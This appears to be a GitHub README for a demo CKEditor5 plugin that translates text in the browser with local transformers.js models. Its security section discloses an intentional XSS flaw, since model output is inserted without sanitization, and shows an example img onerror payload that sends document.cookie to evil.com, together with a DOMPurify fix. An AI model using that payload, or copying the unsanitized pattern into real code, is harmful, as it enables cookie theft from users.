# CKEditor5 Local Translation Plugin

Vibe code demo. Nothing to see here, just playing around...

This demo got its inspiration from ckeditor translation module, that calls the OpenAI API to do the translations. What if we just ran the in the users browser? No need for API keys.

live demo should be available at https://ai.wikman.es/ or https://awikman.github.io/local_model_translate_test/

## What This Is

A CKEditor5 plugin that runs translation models **100% in your browser** using transformers.js and WebGPU/WebAssembly. No API calls, no server needed.

## Features

- ✅ **Zero Server**: All translation happens locally
- ✅ **9 Model Options**: 3 model families × 3 sizes + custom input
- ✅ **GPU Accelerated**: Uses WebGPU when available
- ✅ **Privacy**: No data leaves your browser
- ✅ **200+ Languages**: Via NLLB-200 model
- ✅ **No Build**: Pure ES modules with importmap

## Demo Controls

### Left Sidebar
- **Model Selector**: Choose from NLLB, MarianMT, M2M100 models
- **Source Language**: Set your input language
- **Custom Model**: Paste any Hugging Face model ID
- **Progress Bar**: Watch model loading in real-time
- **Status**: See current operation state

### Editor Toolbar
- **Translate Button**: Click to show target language options
- **Target Languages**: FI, SV, NO, DK, EN (auto-excludes source)

## How Translation Works

1. User selects text in editor
2. Clicks "Translate" → chooses target language
3. Model runs in browser via transformers.js
4. Translated text replaces selection
5. All logged to console for debugging

## Console Logging

Open browser console (F12) to see:
- Model loading progress and timing
- Translation duration
- Errors and warnings
- Performance metrics

## Project Structure

```
LocalTranslator/
├── index.html              # Main demo page
├── server.py              # Development server (local only)
├── README.md              # This file
├── demo/
│   ├── demo.js           # Demo logic
│   └── styles.css        # Demo styling
└── src/
    ├── plugins/
    │   └── LocalTranslation/
    │       ├── plugin.js       # Main plugin class
    │       ├── ui.js          # Toolbar UI
    │       ├── command.js     # Translation command
    │       └── translation.js  # transformers.js wrapper
    └── utils/
        ├── models.js        # Model configurations
        ├── storage.js       # localStorage helpers
        └── logger.js       # Console utilities
```

## Models

### NLLB-200 (Default)
- **Small (300MB)**: Fast, 200 languages
- **Medium (1GB)**: Balanced speed/quality
- **Large (2GB)**: High quality
- **XL (4GB)**: Best quality

### MarianMT (OpusMT)
- Specialized for specific pairs
- Faster than NLLB for supported pairs
- Excellent for EN↔FI, FI↔SV, etc.

### M2M100
- Supports 100+ languages
- Good multilingual encoder-decoder
- Balanced performance

## Browser Requirements

- **Firefox**: 146+ (for importmap)
- **Chrome**: 89+ (for importmap)
- **Safari**: 16.4+ (for importmap)
- **WebGPU**: Recommended for speed (fallback to WASM)

## Known Issues & Notes

### Model Loading First Time
- Can take 3-5 minutes on slow connections
- Progress bar shows real-time status
- Models are cached after first download

### Translation Quality
- Depends on model size and language pair
- Small models good for simple text
- Large models better for technical content

### Performance
- WebGPU: ~2-5x faster than WASM
- GPU memory affects max model size
- Chrome/Edge has better WebGPU support

## Security Warning

### XSS Vulnerability

This demo has a **reflected XSS vulnerability** in the translation pipeline. The LLM's output is inserted directly into CKEditor5 without HTML sanitization.

**Risk:** An attacker who can influence the translation model's output could inject malicious HTML/JavaScript:
- `<script>` tags
- Event handlers (`onclick`, `onerror`, etc.)
- `javascript:` URLs in attributes
- Data exfiltration via injected scripts

**Example attack vector:**
```
User translates text → LLM returns: <img src="x" onerror="fetch('evil.com?cookie='+document.cookie)">
```

**Mitigation for production:**
1. Add DOMPurify sanitization before inserting HTML:
   ```javascript
   import DOMPurify from 'dompurify';
   const sanitized = DOMPurify.sanitize(llmOutput, {
     ALLOWED_TAGS: ['b', 'i', 'u', 'strong', 'em', 'p', 'br', 'ul', 'ol', 'li', 'a', 'span'],
     ALLOWED_ATTR: ['href', 'title'],
     ALLOW_DATA_ATTR: false
   });
   ```

2. Or configure CKEditor5's HTML Support plugin with strict allowlist

**This demo intentionally lacks sanitization for demonstration purposes. Do not use with untrusted content in production environments.**

## Development

### Local Development

```bash
python3 server.py
```

This starts a local HTTP server at http://localhost:8000. Changes to source files are reflected immediately on page refresh.

**Note:** `server.py` is for local development only.

### Deployment

The project is deployed to **GitHub Pages** at https://ai.wikman.es

Deployment is automatic - push to `main` branch and GitHub Pages deploys from `/` (root).

1. Changes pushed to `main` are deployed automatically
2. No build step required - pure ES modules
3. Access at: https://ai.wikman.es

### Cleanup Tasks (Tech Debt)

- [ ] Remove unused `getLanguageCode()` function from `src/utils/models.js`
- [ ] Remove unused `error()` export from `src/utils/logger.js`
- [ ] Remove unused `performance()` export from `src/utils/logger.js`
- [ ] Remove duplicate `translation-ready` event listeners in `demo/demo.js` (3 identical handlers)
- [ ] Remove or implement `updateUI()` function in `demo/demo.js` (currently just logs)
- [ ] Standardize logging to use `log()` from utils instead of `console.log('[DEBUG]', ...)`
- [ ] Consider splitting large `demo/demo.js` into separate modules

### Security Improvements

- [ ] **XSS Vulnerability**: Add DOMPurify sanitization before inserting translated text into CKEditor5 (command.js:170-171)
- [ ] Add input validation for custom model ID (demo.js custom model input)
- [ ] Add Content Security Policy headers to server.py for production

### Performance Improvements

- [ ] Add model preloading on page load (currently requires manual "Load Model" click)
- [ ] Add Service Worker for offline caching of models
- [ ] Add IndexedDB storage for translation history/memory
- [ ] Implement model lazy loading with priority queue
- [ ] **Streaming Translation**: Implement TextStreamer for LLM-based translations to show output token-by-token as it's generated

### LLM Translation Support

The following LLM models have been tested or identified for use with transformers.js v3:

#### Llama Models (Xenova's ONNX Conversions) - **TEST THESE**
These are older Llama models converted by Xenova that should work:
- **Xenova/llama-68m** (~140MB) - Tiny Llama, ONNX format ✅ Should work
- **Xenova/llama-160m** (~320MB) - Small Llama, ONNX format ✅ Should work

These use the `text-generation` pipeline with prompt-based translation.

#### Not Working (Unsupported Architectures)
- **Phi-3-mini** - Error: "Unsupported model type: phi3"
- **Gemma-3-270m/1b** - Error: "Unsupported model type: gemma3_text"
- **SmolLM3-3B-ONNX** - Error: "Unsupported model type: smollm3"

**Why some fail:** transformers.js v3 has a limited set of supported model architectures. Newer LLMs like Phi-3 and Gemma 3 use architectures that are not yet implemented.

**Working approach:** Use smaller, older models like llama-68m/160m that Xenova has already converted to ONNX.

#### Adding LLM Models

LLMs require **prompt-based translation** (not direct translation pipeline). Add to `MODELS` in `src/utils/models.js`:

```javascript
{
  family: 'llama',
  name: 'Llama (Chat LLM)',
  variants: [
    {
      id: '160m',
      name: '160M (~320MB, ONNX)',
      modelId: 'Xenova/llama-160m',
      description: 'Small Llama, prompt-based translation',
      usePrompt: true  // Required: marks as LLM requiring prompts
    }
  ]
}
```

Translation uses this prompt template:
```
You are a professional translator. You ONLY output the actual translation, no explanations.
Source language: {detected from context}
Target language: {target}
Preserve HTML formatting and structure.
Translate this:
{html content}

Translation:
```

### UX Improvements

- [ ] Add progress indicator during translation (not just model loading)
- [ ] Add cancel button for in-progress translations
- [ ] Add keyboard shortcuts (e.g., Ctrl+Shift+T to translate)
- [ ] Add translation history panel
- [ ] Add undo/redo for translations
- [ ] Show translation confidence scores if available from model
- [ ] Add toast notifications instead of status bar updates

### Functionality Gaps

- [ ] Add automatic source language detection using character heuristics
- [ ] Add batch translation for multiple selections
- [ ] Add translation memory for repeated phrases
- [ ] Add favorite/useful translations collection
- [ ] Support translating entire document vs selected text toggle
- [ ] Add support for more language pairs in source selector

### Code Quality

- [ ] Add debug mode flag to disable debug logging in production
- [ ] Add error boundaries and try/catch throughout
- [ ] Refactor TranslationService to not rely on window.transformersPipeline global
- [ ] Add TypeScript for type safety
- [ ] Add unit tests (Jest/Vitest)
- [ ] Add integration tests (Playwright)
- [ ] Add ESLint configuration

1. Enter model ID in "Custom Model" field
2. Click "Apply Custom"
3. Model loads automatically
4. Available for translation

### Console Debugging

Enable detailed logs:
```javascript
localStorage.setItem('ckeditor-translation-debug', 'true');
```

## License

MIT

## Credits

- [CKEditor5](https://ckeditor.com/)
- [Transformers.js](https://huggingface.co/docs/transformers.js)
- [Hugging Face](https://huggingface.co/)
